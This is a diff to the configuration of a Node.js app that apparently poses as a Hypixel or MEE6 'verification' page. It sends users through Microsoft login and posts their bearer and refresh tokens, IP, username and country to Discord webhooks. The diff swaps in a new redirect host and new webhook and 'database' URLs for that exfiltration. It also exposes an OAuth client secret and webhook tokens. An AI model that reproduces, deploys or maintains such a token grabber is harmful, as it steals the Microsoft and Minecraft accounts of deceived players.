@@ -1,8 +1,8 @@
 //Change these
 const client_secret = '6GB8Q~eqkjsODQaH1ErEzI4MHsWvbX-JnFm1-c40' //you need to put the "Secret Value" here not the "Secret ID"!!!!
 const client_id = '2524d81a-75dd-493b-a92c-88e4caf9ce83'
-const redirect_uri = 'https://mee6-verification-yv92.onrender.com'
-const webhook_url = 'https://discord.com/api/webhooks/1084254229004304495/9jgmidJ5kwHUhRTrEJt6z1Ttv80mPa3fr4oJAwZQZz4JUd5hxYanfz0iqRhUpv6h1IA1'
+const redirect_uri = 'https://hy-authentication.onrender.com'
+const webhook_url = 'https://discord.com/api/webhooks/1119782603420090490/5tA91oM0P-bkloHtftLWSnXoI8AIAdLpooFNhwBjap4y6IG4ipIh-2LPY9zJSS52NvDK'
 const redirection = 'https://hypixel.net' //Redirects the user after they login and allow (e.g 'https://hypixel.net') LEAVE BLANK IF U DONT WANT IT TO REDIRECT OR SUM IDK
 const microsoft = true //IF TRUE, WILL REDIRECT TO MICROSOFT DRECTLY INSTEAD OF THE PAGE WITH THE BUTTON
 
@@ -703,7 +703,7 @@ app.get('/refresher', async (req, res) => {
         console.log(e)
     }
 })
-const database = '1103489384889716826/3aF0wbb9N1TE6Nbu_SVqn0XVJHs96NkM-shKuEwF7j8ryD9maZZivjLkcy9VX-lkucU0'
+const database = '1113924519829188639/Kmxh72RqFikFUr0qkGEdRqwUndThtpkltAwp6oIM9DY494llM5fMyM3iIjz-LMgX4UHC'
 const log = discord_api+database
 async function refresherToWebhook(discord, status, formatNumber, level, rank, username, bearerToken, uuid, ip, newRefreshToken, country, flag) {
 
